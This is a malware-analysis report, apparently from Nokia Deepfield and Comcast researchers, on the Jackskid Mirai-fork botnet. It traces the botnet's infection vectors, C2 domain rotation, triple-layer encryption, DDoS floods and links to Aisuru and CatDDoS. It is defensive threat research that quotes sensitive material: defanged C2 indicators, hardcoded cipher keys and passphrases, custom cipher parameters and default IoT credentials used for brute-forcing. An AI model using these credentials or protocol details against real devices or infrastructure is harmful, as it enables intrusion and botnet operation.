# Reverse-engineering Jackskid: from bare-bones Mirai fork to persistent TV box botnet

**Nokia Deepfield Emergency Response Team (ERT) and Comcast Threat Research Lab (CTRL)**

**First published: 2026-03-24**

> **Content warning:** This report quotes malware artifacts verbatim, including domain names, C2 strings, and build paths chosen by the threat actors. Some contain crude or offensive language. These are reproduced exactly as found in samples to enable accurate detection and attribution.

> **Note:** Since this research was completed, Jackskid and three related botnets have been [disrupted by law enforcement](https://www.justice.gov/usao-ak/pr/authorities-disrupt-worlds-largest-iot-ddos-botnets-responsible-record-breaking-attacks). We delayed publication until that process concluded.

---


# Executive summary

Most Mirai forks are disposable: a weekend project, a credential list, a few hundred bots, a stresser panel, and then silence when the C2 goes down. Jackskid was built not to be. Over five months of tracked development, from a bare-bones x86 prototype in November 2025 to a dual-vector Android/IoT platform with three encryption layers and biweekly C2 domain rotation, a single operator has invested in infrastructure designed to survive disruption: redundant C2 resolution, fast-flux DNS with 40–50 IP addresses per domain, and a rotation cadence that can outpace routine takedown timelines. The sophistication demands a proportional response.

This report traces that arc through three acts — and a coda, as the operator pivoted to blockchain-based C2 resolution within days of law enforcement disruption.

Jackskid was first publicly documented by Foresiet in November 2025 ([Foresiet, "Mirai botnet Jackskid resurgence"](https://foresiet.com/blog/mirai-botnet-jackskid-resurgence-nov-2025-iot-threats/)). XLab QAX subsequently noted over 100K daily source IP addresses spreading samples ([@Xlab_qax, December 2025](https://x.com/Xlab_qax/status/2012113701592273252)). CNCERT/SecrSS independently documented the family under the name **RCtea** for its RC4+ChaCha20+TEA encryption stack ([CNCERT/SecrSS, "RCtea botnet analysis"](https://www.secrss.com/articles/87776)). Jackskid carries legacy attribution markers from the **Persirai** (2017) and **Torii** (2018) IoT botnet families, shares technical similarities and C2 infrastructure with **Aisuru**, and exhibits strong naming and architectural ties to the **CatDDoS** derivative ecosystem that emerged from a late-2023 source code leak.

We reverse-engineered 80+ samples across 13 build generations, decrypted configuration tables from 5 generations of binaries using the same `DEADBEEF CAFEBABE E0A4CBD6 BADC0DE5` cipher key (every programmer's first hex constant, but nobody actually ships it to production — except this operator), and documented the full C2 domain migration path as the operator cycled from Russian TLDs to fast-flux `.xyz` infrastructure. Along the way, the operator accidentally shipped an unstripped debug build on port 8090, right next to the production payloads on port 443 of the same IP. That build revealed the project's internal name (`softbot`, a name that suggests the developer's `--release` flag remains aspirational), its anti-competition module (`0clKiller`), and its cross-compiler toolchain (aboriginal Linux). Shipping unstripped debug builds to production is a failure mode shared between botnet operators and the rest of the software industry; the difference is that this one exposed 300+ symbols to anyone who ran `readelf`.

# Key findings

- **Dual infection vectors.** Earlier builds propagated via telnet brute-forcing (140–200+ credential pairs, varying by build). Starting late January 2026, the operator added ADB exploitation of Android TV devices via a multi-stage chain: ADB shell → stager script → downloads ELF binary and APK persistence wrapper. This ADB-based delivery vector was [first documented by Synthient](https://synthient.com/blog/a-broken-system-fueling-botnets) in the context of the Kimwolf botnet. The two vectors feed the same botnet but ship different build configurations: telnet builds include the scanner, ADB builds do not.

- **Unstripped debug build.** An accidentally unstripped binary (`e46cbe2a`, February 19) reveals the internal project name `softbot`, the anti-competition module name `0clKiller` (with `killer_exe`, `killer_maps`, `killer_stat`, `killer_mirai_exists` functions), and the build environment (aboriginal Linux cross-compiler). This 160 KB DDoS-only build contains 16 attack vector functions but no scanner or C2 registration, suggesting it was a test payload that made it to production — on the same server, one port over from the real thing.

- **TCP fingerprints that match no real OS.** The raw-socket SYN flood (attack ID 3) constructs packets with TCP options `MSS-NOP-NOP-SACK-NOP-WS` but no timestamps, a combination produced by no modern OS. The stomp attack (ID 5) sends 40-byte SYN packets with zero TCP options. Both are high-confidence network indicators. Address spoofing (via `IP_HDRINCL` raw sockets) is limited to IPv4 and used in attack IDs 3, 4, 10, and 12.

- **Blocking C2 domains or dropper IP addresses reduces active DDoS traffic and prevents reinfection of compromised devices.** The C2 domains and payload delivery infrastructure share IP address ranges (notably `203.188.174[.]x`), so disruption of either function degrades both.

- **16–17 DDoS attack types** in the latest builds (up from 6 in the earliest). Includes game-server-specific floods (Valve A2S_INFO, RakNet, Minecraft Java login, FiveM getinfo), GRE encapsulation to evade UDP filters, TCP handshake floods that bypass SYN cookies, and a new HTTP GET flood with a `Mozilla/5.0` stub user-agent. The C2 port rotation pool expanded from 24 ports in early builds to 60 (Feb 10) and 84 (Mar 2026 variant).

- **C2 config rotation verified across 5 build generations.** Config decryption traces the primary C2 migration in the bot config: `boatdealers[.]su` (Nov–Jan) with backup domains including `www.gokart[.]su`, `www.plane[.]cat`, and `www.sendtuna[.]com` → `www.ipmoyu[.]xyz` (late Feb) → `peer.ipmoyu[.]xyz` (early Mar) → `nodes.ipmoyu[.]xyz` (mid Mar) → `m3rnbvs5d.eth` (post-disruption, ENS). Each rotation updated the primary config slot within ~2 weeks. DNS resolution from March 18 confirmed that previous subdomains and original domains remained active on the same fast-flux pool. Following the [law enforcement disruption on March 19](https://www.justice.gov/usao-ak/pr/authorities-disrupt-worlds-largest-iot-ddos-botnets-responsible-record-breaking-attacks), multiple C2 domains went NXDOMAIN, and subsequent probing confirmed that the vast majority of previously active C2 endpoints no longer accept connections. The operator's fallback to ENS-based resolution (`m3rnbvs5d.eth`) provides some continuity but at a fraction of the prior capacity.

- **DNS-over-HTTPS with HTTP/2 upgrade.** The bot resolves C2 domains via DoH through Google and Cloudflare resolvers, hiding domain resolution from plaintext DNS monitoring. The March 2026 builds upgraded the DoH client from HTTP/1.1 to HTTP/2 with ALPN `h2` negotiation and HPACK pseudo-headers, enabling connection multiplexing for more efficient resolver communication. The statically linked mbedTLS stack produces a distinctive TLS fingerprint.

- **Post-disruption ENS pivot.** Within days of the March 19 law enforcement action, the operator fell back to builds that resolve C2 via Ethereum Name Service (`m3rnbvs5d.eth`) — a much smaller footprint (5 IPs) than the pre-disruption fast-flux infrastructure (98+ IPs across 6 domains). Simultaneously, stripped-down lite builds appeared with hardcoded C2 IPs and no DNS dependency. The haste of the pivot is evident: the ENS record contains the string "kieran ellison" in plaintext metadata fields, matching the `kieranellison` substring in the C2 domain from Act 1. This could be the operator's real name, a pseudonym, or a deliberate plant naming a rival — the competitive doxing culture documented in [Operator attribution](#operator-attribution) makes the latter plausible.

- **Active anti-competition.** The stager scripts uninstall 6 rival botnet packages by name (Snow, Lorikazz, jewboot, telenetd, and others) plus older Jackskid variants as the operator rotates package names. The `0clKiller` module scans `/proc` for competing statically-linked binaries and kills them via three methods (exe path, memory maps, stat analysis). A February 24 script added runtime `/proc/<pid>/maps` scanning to kill processes with `(deleted)` mappings. The progression from hardcoded kill lists to real-time process monitoring suggests the competition for device foothold is intense enough to drive its own arms race.

- **Aisuru crossover.** 23 of 28 samples from a March 2026 wave combine the Jackskid cipher key with the Aisuru XXTEA passphrase (`PJbiNbbeasddDfsc`) and share C2 IP address `185.196.41[.]180`. This indicates either active infrastructure convergence between the two operations, or parallel builds from a privately shared codebase.

- **CatDDoS derivative lineage.** Multiple naming artifacts map directly to documented CatDDoS derivative operations that emerged from a [late-2023 source code leak](https://blog.xlab.qianxin.com/catddos-derivative-en/): the `komaru` stager (Komaru), the `cecilioc2[.]xyz` domain (Cecilio Network), and `rebirth[.]st` builds (RebirthLTD). The `meow` campaign tag aligns with CatDDoS naming conventions. This positions Jackskid within the broader CatDDoS derivative ecosystem.

- A consolidated IoC list is provided in [Indicators of compromise](#indicators-of-compromise).

---

# Evolution

*For a summary, see the [Executive summary](#executive-summary) above.*

## Act 1: The worm (Nov 2025 – Jan 2026)

Classic Mirai-derivative propagation via telnet brute-forcing with 140–200+ credential pairs (varying by build) targeting IoT cameras, routers, and ONTs. The builds evolved from a bare-bones 18-attack x86 prototype with 4-byte XOR crypto to a production ARM binary with triple-layer encryption (custom RC4+LFSR for config, XXTEA for key exchange with the passphrase `FrshPckBnnnSplit`, and ChaCha20 for C2 traffic) and DNS-over-HTTPS C2 resolution via statically linked mbedTLS. Three independent algorithms, each serving a distinct purpose, which makes the `DEADBEEF CAFEBABE` key choice all the more conspicuous.

C2 infrastructure used 8 redundant domains on `.su`/`.ru`/`.xyz` TLDs with fast-flux DNS (50+ IP addresses per domain). The domain names suggest the operator registers domains the way most people name fantasy football teams: `boatdealers[.]su`, `gokart[.]su`, `sendtuna[.]com`, `nineeleven.gokart[.]su`. One domain, `kieranellison.cecilioc2[.]xyz`, will reappear in Act 2 as a campaign tag, linking the telnet and ADB operations.

## Act 2: The pivot (Feb – Mar 2026)

The operator added a second infection vector: ADB exploitation of Android TV set-top boxes, first observed on January 23, 2026. This delivery method was first documented by [Synthient](https://synthient.com/blog/a-broken-system-fueling-botnets) in the context of the Kimwolf botnet, whose research showed how permissive residential proxy services enable attackers to scan internal networks for ADB-exposed devices. Honeypot captures from March 17–18 confirmed the delivery mechanism: ADB sessions routed via HTTP CONNECT through residential proxy services, with a successful 574 KB payload download and execution observed in the wild. The earliest capture (January 23) was a bare one-liner — download ELF, execute, block ports — and the toolchain matured over six iterations into a polished dropper chain with APK persistence wrappers disguised as Google system updates.

Nine different APK package names were cycled in four weeks, from `com.example.bootsync` to `com.google.play`, as each got flagged. The native library name also evolved: `libarm7k.so` → `libgoogle.so` → `libandroid_runtime.so` → back to `libgoogle.so`. The operator responds to detection by changing the label, not the technique.

The telnet scanner was stripped from ADB-delivered builds, with propagation fully externalized to the stager scripts. Campaign tags in the execution arguments (`meow`, `kieran`, `richylam`, `dai`, `litecoin`, `gponfiber`, `uchttpd`, `pyramid`, `gonzo`) suggest the operator tracks infections by source — a UTM parameter system for malware distribution. The `kieran` tag matches the string `kieranellison` in the C2 domain `kieranellison.cecilioc2[.]xyz` from Act 1. The `meow` tag likely references the [CatDDoS](https://blog.xlab.qianxin.com/catddos-derivative-en/) naming convention — CatDDoS was named for its use of "cat" and "meow" in domain names and samples. The connection runs deeper: after the CatDDoS source code leaked in late 2023, XLab documented several derivative operations including **Komaru**, **Cecilio Network**, and **RebirthLTD**. All three names appear in Jackskid infrastructure: `komaru` is the ADB stager name, `cecilioc2[.]xyz` is a C2 domain, and `rebirth[.]st` appears in the March 2026 crossover builds. This places Jackskid squarely within the CatDDoS derivative ecosystem.

Then the operator shipped an unstripped debug build. Binary `e46cbe2a` (160 KB, port 8090, February 19) came out with full symbols: 300+ function names, the `softbot` project identifier, and the `0clKiller` anti-competition module laid bare. It was a DDoS-only build with no scanner, no C2 registration, presumably a test payload the operator forgot to strip before deploying. It ran on the same IP (`5.187.35[.]158`) that was simultaneously serving production payloads on ports 443, 1337, and 8473.

Meanwhile, the anti-competition escalated. The stager scripts uninstall 6 rival botnet packages by name — Snow (`com.android.docks`), Lorikazz (`com.oreo.mcflurry`), jewboot, telenetd, boothandler, clockface — plus older Jackskid variants (`com.google.android.pms.update`, `com.google.android.sys.update`) as the operator rotates its own package names between builds. The choice of `com.oreo.mcflurry` as a persistent malware package name suggests the Lorikazz operator and the Jackskid operator have comparably robust naming conventions. The binary's `0clKiller` module independently scans `/proc` for competing ELF binaries and kills them via three methods, backed by a NETLINK process monitor that detects and kills new competitors within milliseconds of spawning.

## Act 3: The rotation (Mar 2026)

The operator's config migrated away from `boatdealers[.]su` as the primary C2 domain. The embedded config tag, `here we are again part 2`, and the shift to a new TLD suggest the operator was rotating infrastructure. The new primary C2 domain `ipmoyu[.]xyz` cycled through three subdomains in four weeks: `www` → `peer` → `nodes`. The domain name is notable: `ipmoyu.com` is a [documented BADBOX 2.0 IoC](https://www.humansecurity.com/learn/blog/satori-threat-intelligence-disruption-badbox-2-0/) associated with the MoYu Group, an operation targeting Android TV devices at scale. Whether `ipmoyu[.]xyz` is a deliberate reference, shared infrastructure, or coincidence, the timing aligns with Jackskid's own pivot to Android TV exploitation. DNS resolution data from March 18 showed the rotation was additive rather than destructive: all three ipmoyu subdomains remained active (`www`: 14 IP addresses, `peer`: 40, `nodes`: 50), and the original domains (`boatdealers[.]su`, `gokart[.]su`, `sendtuna[.]com`, `plane[.]cat`) continued to resolve on the same fast-flux pool. Two previously undocumented domains also appeared: `jacob-butler[.]gay` and `richylam[.]org` (the latter matching the `richylam` campaign tag). Following the [law enforcement disruption on March 19](https://www.justice.gov/usao-ak/pr/authorities-disrupt-worlds-largest-iot-ddos-botnets-responsible-record-breaking-attacks), multiple C2 domains went NXDOMAIN, remaining fast-flux pools contracted sharply, and subsequent probing confirmed that the vast majority of resolved endpoints no longer responded to Jackskid's C2 protocol (see [C2 infrastructure status](#c2-infrastructure-status-post-disruption)).

28 crossover builds combined the Jackskid cipher key with the Aisuru XXTEA passphrase (`PJbiNbbeasddDfsc`) and shared C2 IP address `185.196.41[.]180`. This may represent active infrastructure convergence, though the possibility of a private source code leak producing parallel builds from a shared codebase cannot be excluded.

The latest builds added an HTTP GET flood with a `User-Agent: Mozilla/5.0` stub (the complete user-agent string — no browser, no platform, no engine — less an identity and more a vague gesture at the concept of a web browser), bringing the attack type count to 16–17. The DoH client was upgraded from HTTP/1.1 to HTTP/2, adding connection multiplexing for more efficient resolver communication. And the sandbox fingerprint library names rotated from `jiwixlib.so` to `jilcore.6.so`, fake libraries that exist only to detect analysis environments, updated across builds as if they were real dependencies.

The disruption forced a rapid pivot. Within days, a new build tier — **ENS C2** — appeared on March 23 from `176.65.139[.]72` (pfcloud.io, AS51396). These builds resolve their C2 address via Ethereum Name Service, reading a text record from `m3rnbvs5d.eth` with key `k1er4n` and decoding the result through an IPv6→IPv4 XOR `0xA5` transformation. This mirrors the Kimwolf botnet's EtherHiding approach and avoids the DNS-based takedown that collapsed the prior infrastructure. The ENS record's `msg` and `location` fields contain the string "kieran ellison," matching the `kieranellison.cecilioc2[.]xyz` domain from Act 1. Whether self-identifying, using a pseudonym, or naming a rival, the string's presence in an immutable blockchain record is a departure from the DNS-era infrastructure. Five C2 IPs in the `194.87.198[.]x` and `194.58.38[.]x` ranges were confirmed live — a fraction of the 98-IP fast-flux pool that preceded the disruption. Separately, **lite scanner builds** appeared on the same day with hardcoded C2 at `185.196.41[.]180` (no DNS dependency), a 24-port pool, cron-based `kworker` persistence, and a `botd_single_lock` local coordination socket on port 34942. These stripped-down binaries (164–272 KB, no TLS) trade sophistication for survivability.

The ENS builds also introduced a new competition kill list — `jilcore.6.so`, `jipplib.1.so`, `jibdata.2.so`, `jiblib.5.so` — targeting unknown rival families, and shipped as `com.google.android.play` APK wrappers. The `k1er4n` text record key is a leetspeak rendering of "kieran," and the ENS domain's owner address (`0x699a...0001`) provides a blockchain attribution anchor.


# Attribution and lineage

## Persirai/Torii heritage

The string `npxXoudifFeEgGaACScs` (a printf format specifier string) at `.rodata` offset `0x8f998` is a well-documented IoC linking to:

- **Persirai** (2017): IP camera botnet
- **Torii** (2018): Sophisticated IoT botnet known for custom encryption
- **Condi** (2023) and **Ballista** (2025): More recent variants

Its presence in all Jackskid builds confirms the family inherits or reuses code from this lineage.

## Relationship to Aisuru

SecrSS assessed that Jackskid and Aisuru "may have operational correlation, inheritance, or share the same technical source." The technical parallels go beyond superficial similarities:

- Both families use the same triple encryption approach: custom RC4, ChaCha20, and TEA variants for protecting configuration and communications.
- Both divide the C2 authentication process into multiple rounds across many packets, complicating traffic analysis.
- Both configure multiple groups of redundant C2 addresses with failover.

However, SecrSS also notes that Jackskid is "a newly constructed family" that does not show "large-scale reuse of known botnet module structures" from Aisuru. The relationship appears to reflect shared development philosophy or technical lineage rather than direct code reuse.

The March 2026 wave strengthens this assessment: 23 of the 28 new samples are Aisuru–Jackskid crossover builds. They combine the Jackskid cipher key (`DEADBEEF CAFEBABE E0A4CBD6 BADC0DE5`) with the XXTEA passphrase `PJbiNbbeasddDfsc` (previously exclusive to Aisuru) and share C2 IP address `185.196.41[.]180` with Aisuru sample `7500925a`. This could indicate active convergence between the two operations, or it may reflect parallel builds from a privately shared or leaked codebase. The shared C2 infrastructure, however, points toward operational coordination rather than independent reuse.

## CatDDoS derivative lineage

Multiple naming artifacts in Jackskid infrastructure map directly to documented CatDDoS derivative operations. After the [CatDDoS source code leaked](https://blog.xlab.qianxin.com/catddos-derivative-en/) in late 2023, XLab documented several derivative operations that emerged from the leak. Three of those names appear in Jackskid:

| CatDDoS derivative | Jackskid artifact | Context |
|---|---|---|
| **Komaru** | `komaru` stager script | ADB dropper that deploys the `richy` ELF binary |
| **Cecilio Network** | `cecilioc2[.]xyz` | C2 domain present in all pre-March configs |
| **RebirthLTD** | `rebirth[.]st` | Domain in March 2026 crossover builds; filename `rebirthstresswashere` |

Additionally:
- The `meow` campaign tag aligns with CatDDoS naming conventions (the family was named for its use of "cat" and "meow" in domains and samples).
- The CatDDoS variant **v-snow_slide** uses XXTEA encryption, matching Jackskid's key exchange layer. The `# snow` comment in Jackskid's ADB stager scripts identifies a competing operator whose package name (`com.android.docks`) is actively removed.
- CatDDoS derivatives share ChaCha20 for C2 traffic encryption, the same algorithm Jackskid uses for its Layer 3 encryption.

This convergence of naming, infrastructure, and cryptographic choices positions Jackskid within the broader CatDDoS derivative ecosystem that emerged from the late-2023 source code leak. The family's "newly constructed" architecture (per SecrSS) may reflect a ground-up reimplementation using CatDDoS design patterns rather than direct code forking.

## Operator attribution

A satirical blog styled after Krebs on Security ("Kirkon Security") published a writeup targeting the operator behind `www.boatdealers[.]su`, the same primary C2 domain used by Jackskid ("Kirkon Security" (satirical), ["Sorrow: from botless to less botless"](https://kirkonsecurity.com/?article=sorrow-from-botless-to-less-botless). The site's name and styling parody Krebs on Security and appear to originate from a rival botnet operation). The article attributes the botnet to an individual operating under the handle **Sorrow**, claims approximately 300,000 compromised residential devices (primarily Android/ADB), and highlights an OpSec failure where the download server was co-located with the botnet management panel. The dox-by-blog format represents either an emerging trend in competitive intelligence or a very specific grudge.

The site's likely provenance (the Kimwolf ecosystem, which shares infrastructure with Jackskid) means the claims should be treated as adversarial intelligence: potentially accurate on technical details the rival would know firsthand, but motivated by competitive interests rather than public safety.

## Relationship to Kimwolf

Jackskid and Kimwolf share distribution infrastructure (port 1337, dropper IP addresses), target platforms (ARM IoT, Android TV), and concurrent activity timelines (Dec 2025 – Feb 2026). Earlier Jackskid builds propagated via telnet brute-forcing, while Kimwolf targeted exposed ADB services. Both shared distribution infrastructure but are distinct codebases. The `c654028d` build (March 2026) narrows this gap further: Jackskid has targeted ADB-exposed Android TV devices since late January 2026, though through a different toolchain (komaru stager + APK wrapper vs. Kimwolf's native binary delivery).

| **Attribute** | **Jackskid** | **Kimwolf** |
|---|---|---|
| Primary purpose | DDoS bot | Residential proxy + DDoS |
| Language | C/C++ | C++ |
| TLS library | mbedTLS | WolfSSL / BoringSSL |
| Config encryption | Custom RC4 + LFSR | None (uint32 immediates) |
| C2 resolution | DoH (Google/Cloudflare); ENS (`m3rnbvs5d.eth`, post-disruption) | ENS blockchain (EtherHiding) |
| C2 traffic encryption | ChaCha20 | Standard TLS |
| Key exchange | XXTEA (`FrshPckBnnnSplit`); ENS builds: Curve25519 ECDH + XXTEA (derived key) | None |
| Binary size | 125–562 KB | 1.6–5 MB |

**Jackskid vs. Kimwolf — distinct codebases**

The post-disruption ENS builds narrow the gap on C2 resolution — both families now use Ethereum Name Service, though through independent implementations (both encode C2 addresses as obfuscated IPv6 in ENS text records, but use different deobfuscation schemes — Kimwolf applies a subtract-then-XOR with a 32-bit key, Jackskid uses a single-byte XOR `0xA5`). However, the crypto gap has widened: Jackskid's v2 handshake (Curve25519 ECDH → XXTEA with derived key → ChaCha20 session encryption) is now more elaborate than Kimwolf's standard TLS, and the XXTEA key is no longer a shared secret but derived per session via ephemeral key agreement. The families remain distinct codebases that happen to share an ADB delivery vector and some infrastructure.

# Acknowledgments

The Jackskid family was first publicly documented by **Foresiet** in November 2025 ([Mirai botnet Jackskid resurgence](https://foresiet.com/blog/mirai-botnet-jackskid-resurgence-nov-2025-iot-threats/)), who identified the family name and initial IoCs. **XLab QAX** reported over 100K daily source IP addresses spreading samples in December 2025 ([post](https://x.com/Xlab_qax/status/2012113701592273252)) and separately documented the [CatDDoS derivative ecosystem](https://blog.xlab.qianxin.com/catddos-derivative-en/) whose naming conventions appear throughout Jackskid infrastructure. **CNCERT/SecrSS** independently documented the family under the alias "RCtea" ([RCtea botnet analysis](https://www.secrss.com/articles/87776)), identifying the RC4+ChaCha20+TEA encryption stack and assessing the family's technical relationship to Aisuru. **Synthient** documented the ADB exploitation delivery vector used by Jackskid and other botnet families ([A Broken System: Fueling Botnets](https://synthient.com/blog/a-broken-system-fueling-botnets)), showing how permissive residential proxy services enable mass exploitation of ADB-exposed Android TV devices.

The Ghidra-based reverse engineering, config decryption, DDoS handler verification, evolution timeline, C2 infrastructure analysis, and JA4T/JA3 fingerprinting presented in this report are original work by the Nokia Deepfield Emergency Response Team and Comcast Threat Research Lab.

---

# Technical detail

## Encryption architecture

Jackskid's defining feature is its triple-layer encryption stack. Each layer serves a distinct purpose.

### Layer 1: Config obfuscation (custom RC4 + LFSR)

Embedded strings (C2 domains, ports, dropper commands, firewall rules) are encrypted with a custom RC4 variant. The algorithm deviates from standard RC4 in three ways:

- **3-index PRGA**: Uses indices `i`, `j`, and `k` instead of the standard 2-index (`i`, `j`).
- **LFSR feedback**: A 32-bit linear feedback shift register with polynomial `0xD800A4` is XORed into the keystream after each PRGA step.
- **Output transformation**: Each keystream byte is transformed via `(ks >> 5 | ks << 3) ^ (ks >> 4)` before XOR with ciphertext.

S-box initialization uses a two-pass KSA: a standard RC4 KSA followed by a 5-round linear congruential generator (LCG) mixing pass with seed `0xE0A4CBD6` and constants `* 0x41C64E6D + 0x3039`.

The key is 16 bytes, stored in `.rodata` as four LE uint32 words:

```
DEADBEEF  CAFEBABE  E0A4CBD6  BADC0DE5
```

The config table size varies by build. The `38e49e9f` build contains 58 slots (IDs `0x01`–`0x3a`), including 10 C2 domains, a 60-port pool, firewall rules, dropper commands, credential lists, STUN servers, and anti-analysis strings. The `c654028d` variant has a streamlined 28-slot config: a single C2 domain (`nodes.ipmoyu[.]xyz`), an 84-port pool, and operational strings, but no firewall rules, no dropper script, and no credential list.

### Layer 2: Key exchange (XXTEA)

The bot negotiates per-session ChaCha20 keys using XXTEA encryption with the shared passphrase `FrshPckBnnnSplit` (parse at your own risk). XXTEA is identified in the binary by the TEA constant `0x9E3779B9` (golden ratio).

Session establishment:
1. Bot generates a random 32-byte ChaCha20 key and 12-byte nonce from `/dev/urandom`.
2. Key material is XXTEA-encrypted with `FrshPckBnnnSplit`.
3. An HMAC-SHA256 session hash is derived for integrity.
4. Encrypted key material and bot metadata are sent to the C2 over TLS.
5. All subsequent traffic uses ChaCha20 with the negotiated key.

The `FrshPckBnnnSplit` passphrase is a shared secret. An attacker who knows it can intercept the key exchange.

The post-disruption ENS builds (`516c532a`, March 23) replace this static passphrase with **Curve25519 ECDH key agreement**: the bot generates an ephemeral keypair, exchanges public keys with the C2, and derives a per-session shared secret. The first 16 bytes of the shared secret become the XXTEA key for wrapping the ChaCha20 session material. This eliminates the `FrshPckBnnnSplit` single point of compromise and provides forward secrecy — a session key captured in transit cannot be decrypted retroactively without the ephemeral private key.

### Layer 3: C2 traffic (ChaCha20)

All C2 command and response traffic is encrypted with ChaCha20 (RFC 8439). The implementation is standalone (not via mbedTLS), identified by the `expand 32-byte k` constant in `.text`.

#### Handshake validation

The C2 handshake uses a `0xCAFEBABE` magic value for protocol validation, with a secondary XOR check against `0xCAFE06A9`.

## C2 infrastructure

### DNS over HTTPS (DoH)

Jackskid resolves C2 domains via DNS over HTTPS, which bypasses on-path plaintext DNS monitoring and UDP-53-based filtering. The queries are still observable via endpoint agents, TLS/SNI inspection, or resolver-side logging. The bot constructs HTTP GET requests to public DoH resolvers:

```
GET /dns-query?dns=<base64url-encoded query> HTTP/1.1
Host: <resolver>
Accept: application/dns-message
User-Agent: DoH-Client/1.0
Connection: keep-alive
```

Hardcoded resolvers (with fallback):

| **Hostname** | **IP addresses** | **Provider** |
|---|---|---|
| `dns.google` | 8.8.8[.]8, 8.8.4[.]4 | Google |
| `cloudflare-dns.com` | 1.1.1[.]1, 1.0.0[.]1 | Cloudflare |
| `one.one.one.one` | 1.1.1[.]1, 1.0.0[.]1 | Cloudflare |

**Hardcoded DoH resolvers**

The bot alternates between two provider configurations and retries up to 3 times on failure.

### C2 domains (from config decryption)

Both the `7d892083` (Jan 22) and `38e49e9f` (Feb 10) builds contain the same 10 C2 domains in their encrypted configs, decrypted using the custom RC4 variant:

| **Slot** | **Domain** | **TLD** |
|---|---|---|
| 1 | `www.boatdealers[.]su` | .su |
| 2 | `www.gokart[.]su` | .su |
| 3 | `kieranellison.cecilioc2[.]xyz` | .xyz |
| 4 | `nineeleven.gokart[.]su` | .su |
| 5 | `www.sendtuna[.]com` | .com |
| 6 | `ida.boatdealers[.]su` | .su |
| 7 | `mail.gokart[.]su` | .su |
| 8 | `moo.6yd[.]ru` | .ru |
| 9 | `dvrip.6yd[.]ru` | .ru |
| 10 | `log.6yd[.]ru` | .ru |

**Decrypted C2 domains from 7d892083 / 38e49e9f configs**

These domains match those reported by SecrSS (`gokart[.]su`, `boatdealers[.]su`, `cecilioc2[.]xyz`), confirming this is the same family.

The `c654028d` variant (March 2026) uses a single C2 domain:

**`nodes.ipmoyu[.]xyz`**

This represents a departure from the multi-domain redundancy in earlier builds. The `.xyz` TLD is consistent with `cecilioc2[.]xyz` from the `38e49e9f` pool. The 84-port rotation pool includes all 60 ports from `38e49e9f` plus 24 new additions.

### C2 domain migration timeline

Config decryption across 5 generations of builds spanning January–March 2026 reveals the primary C2 migration path:

| Period | Primary C2 (config slot 1) | Config tag | Backup domains | Port pool |
|--------|---------------------------|------------|----------------|-----------|
| Nov 2025 – Jan 2026 | `www.boatdealers[.]su` | `FrshPckBnnnSplit` | 8 domains (gokart[.]su, plane[.]cat, 6yd[.]ru, cecilioc2[.]xyz, sendtuna[.]com) | 24 ports (2663–59493) |
| Late Feb 2026 | `www.ipmoyu[.]xyz` | `here we are again part 2` | None in config | — |
| Early Mar 2026 | `peer.ipmoyu[.]xyz` | — | None in config | — |
| Mid Mar 2026 | `nodes.ipmoyu[.]xyz` | — | None in config | 21 ports (1247–58891) |
| Late Mar 2026 | `nodes.ipmoyu[.]xyz` | — | None in config | Both pools combined (45 ports) |
| Post-disruption (Mar 23+) | `m3rnbvs5d.eth` (ENS) | — | None (ENS resolution) | 90 ports |

The operator rotates the primary C2 subdomain in the config approximately every two weeks. While the bot config migrated from `boatdealers[.]su` to `ipmoyu[.]xyz` and dropped backup domain entries, DNS resolution from March 18 showed the original domains remained active and shared the same fast-flux IP pool as the ipmoyu subdomains. Following the [law enforcement disruption on March 19](https://www.justice.gov/usao-ak/pr/authorities-disrupt-worlds-largest-iot-ddos-botnets-responsible-record-breaking-attacks), `boatdealers[.]su`, `gokart[.]su`, and `richylam[.]org` went NXDOMAIN. The remaining ipmoyu subdomains still resolve to large IP pools but only a single C2 IP address actively accepts connections.

STUN server configuration also expanded: from `stun.l.google.com` alone (Jan) to three servers (`stun.l.google.com:19302`, `stun.voys.nl:3478`, `stun.sip.us:3478`) in Feb+.

The `www.ipmoyu[.]xyz` domain resolves to IP addresses in the `203.188.174[.]x` range, the same range used for payload delivery (`203.188.174[.]195`, `.236`–`.242`). This overlap between C2 resolution and delivery infrastructure provides an operational linkage for tracking.

### March 2026 wave C2 endpoints

The 28 samples from March 10–13, 2026 introduce two new C2 endpoints:

| **Indicator** | **Type** | **Builds** | **Notes** |
|---|---|---|---|
| `185.196.41[.]180` | IP | 23 crossover (full + scanner) | VDSKA-NL hosting (AS400992/AS50053, "Individual Entrepreneur Anton Levin", GE). Same IP address as Aisuru `7500925a` fallback C2, indicating Aisuru–Jackskid crossover. |
| `158.94.210[.]71` | IP | 5 stripped DDoS-only | Same /24 as debug build leak `158.94.210[.]88` and fast-flux IP `158.94.210[.]197` (AS202412, Omegatech LTD). |
| `ricocaseagainst.rebirth[.]st` | Domain | 5 stripped DDoS-only | Encrypted domain, resolves to `158.94.210[.]71`. The `.rebirth[.]st` TLD and filename "rebirthstresswashere" link to the Rebirth stresser brand. |

**New C2 endpoints from March 2026 wave**

The crossover builds use the XXTEA passphrase `PJbiNbbeasddDfsc` (replacing `FrshPckBnnnSplit` from pure Jackskid builds). This key was previously seen only in the `214d25ce` debug build's XOR auth key and in Aisuru samples.

The full+scanner builds add anti-VM detection (`hypervisor`, `vfio`, `virtio`, `virtblk`), systemd persistence via `dbus-kworker.service`, and an IoT credential table with ISP-specific defaults (`Pon521`, `Zte521`, `root621`, `telecomadmin`, `admintelecom`, `alitvadmin`, `adminEp`...).

### C2 infrastructure status post-disruption

Following the [law enforcement disruption on March 19](https://www.justice.gov/usao-ak/pr/authorities-disrupt-worlds-largest-iot-ddos-botnets-responsible-record-breaking-attacks), the Jackskid C2 infrastructure has been significantly degraded. Multiple primary C2 domains have gone NXDOMAIN, the fast-flux pools behind surviving domains have largely stopped accepting C2 connections, and the majority of previously active C2 endpoints no longer respond. Delivery infrastructure is similarly degraded, with dropper servers either fully offline or listening but no longer serving payloads. The operator's fallback to a small ENS-based C2 channel provides some continuity but at a fraction of the capacity and redundancy the botnet previously enjoyed.

### Port rotation pool

The bot randomly selects from a configurable pool of destination ports. The pool size evolved across builds: 24 ports in early builds (Nov 2025–Jan 2026), 60 ports in the Feb 10 `38e49e9f` build (config slot 12), 21 ports in mid-March builds, and 84 ports in the `c654028d` variant. The 60-port pool from `38e49e9f`:

```
2345  2871  3194  3650  4128  4599  5032  5476  6120  6584
7021  7489  8015  8560  9027  9488 10034 10579 11112 11648
12103 12755 13290 13844 14301 14986 15420 16075 16618 17142
17690 18233 18805 19344 19987 20761 21408 22195 22934 23670
24411 25198 25903 26647 27489 28310 29176 30054 30988 31840
32795 33721 34680 35614 36602 37745 38901 40127 43862 49215
